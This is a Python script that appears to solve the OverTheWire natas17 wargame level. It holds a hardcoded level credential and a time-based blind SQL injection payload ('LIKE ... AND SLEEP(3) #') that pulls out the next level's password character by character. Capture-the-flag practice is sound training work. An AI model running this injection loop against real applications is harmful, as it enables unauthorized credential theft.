import requests
from string import *
from time import *

c = ascii_lowercase + ascii_uppercase + digits
username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url = "http://natas17.natas.labs.overthewire.org"
pw = ""

session = requests.Session()


def get_password(seen_pw):
    u = "natas18"
    for i in c:
        start_time = time()
        response = session.post(url, auth=(username, password), data={"username": f'{u}" AND BINARY password LIKE "{seen_pw}{i}%" AND SLEEP(3) #'})
        end_time = time()
        if end_time - start_time >= 2:
            print("Found character:", i)
            seen_pw = seen_pw + i
            
        else:
            print("Not found:", i)
    return seen_pw

seen_pw = ""
for _ in range(64):
    seen_pw = get_password(seen_pw)
    
print("Password:", seen_pw)